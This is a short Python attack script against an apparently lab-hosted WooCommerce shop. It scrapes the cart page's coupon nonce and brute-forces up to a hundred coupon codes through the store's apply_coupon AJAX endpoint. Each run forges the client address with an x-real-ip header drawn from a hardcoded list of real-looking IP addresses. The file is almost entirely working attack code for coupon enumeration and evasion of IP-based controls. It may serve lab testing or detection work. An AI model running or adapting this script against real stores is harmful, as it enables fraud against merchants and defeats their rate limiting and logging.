import requests, re, random, argparse

# define arguments: target url
parser = argparse.ArgumentParser()
parser.add_argument("-n", "--node", help="Target Node number", default="01", required=True)
args = parser.parse_args()

ua = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36"
url = f"http://{args.node}.lab.be3rse.com"

ips = [
    '116.179.32.104',
    '116.179.32.13',
    '116.179.32.149',
    '116.179.32.241',
    '116.179.32.28',
    '116.179.37.116',
    '116.179.37.135',
    '116.179.37.147',
    '116.179.37.169',
    '116.179.37.198',
    '116.179.37.203',
    '116.179.37.206',
    '116.179.37.210',
    '116.179.37.232',
    '116.179.37.247',
    '116.179.37.84',
    '139.198.19.213',
    '185.234.69.215',
    '188.243.183.190',
    '191.101.31.55',
    '193.56.254.36',
    '193.56.254.37',
    '212.102.57.158',
    '222.148.169.215',
    '3.87.144.193',
    '3.92.128.229',
    '45.142.122.213',
    '46.161.11.43',
    '54.236.117.26',
    '65.108.0.71',
    '66.249.66.219',
    '66.249.77.53',
    '88.130.134.80',
    '91.211.88.127'
]

def get_random_ip():
    return random.choice(ips)

src_ip = get_random_ip()

# go to /cart
print(f"Going to {url}/cart")
res = requests.get(
    f"{url}/cart/",
    headers={
        "User-Agent": ua,
        "x-real-ip": src_ip,
    },
)

m = re.search(r'apply_coupon_nonce["][:]["]([^"]+)["].+', res.text)
if m:
    print(f"Found coupon nonce: {m.group(1)}")

    print(f"Applying coupon...\n")
    if True:
        for i in range(0,100):
            coupon = f"BE3RSE-{i}"
            res = requests.post(
                f"{url}/?wc-ajax=apply_coupon",
                headers={
                    "User-Agent": ua,
                    "x-real-ip": src_ip,
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                },
                data=f"security={m.group(1)}&coupon_code={coupon}",
                allow_redirects=True
            )

            if re.search("Coupon code applied successfully", res.text):
                print(f"[OK] ---------> Coupon {coupon} applied successfully")
                coupon_not_found = False
                break
            elif re.search("-1", res.text):
                print(f"[ERROR] Coupon {coupon} something went wrong (status code {res.status_code}).")
            else:
                print(f"[SKIP] Coupon {coupon} not applied (status code {res.status_code})")